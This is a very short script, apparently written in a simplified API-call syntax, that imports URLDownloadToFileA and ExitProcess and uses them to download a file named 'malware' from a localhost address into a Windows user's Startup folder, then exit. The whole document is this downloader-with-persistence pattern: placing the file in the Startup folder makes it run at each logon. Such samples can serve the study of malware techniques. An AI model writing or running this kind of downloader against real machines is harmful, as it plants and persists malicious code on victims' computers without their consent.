function URLDownloadToFileA("urlmon.dll");
function ExitProcess("kernel32.dll");

URLDownloadToFileA(0,"http://127.0.0.1/malware","C:/Users/Alexa/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/malware2.txt",0,0);
ExitProcess(0);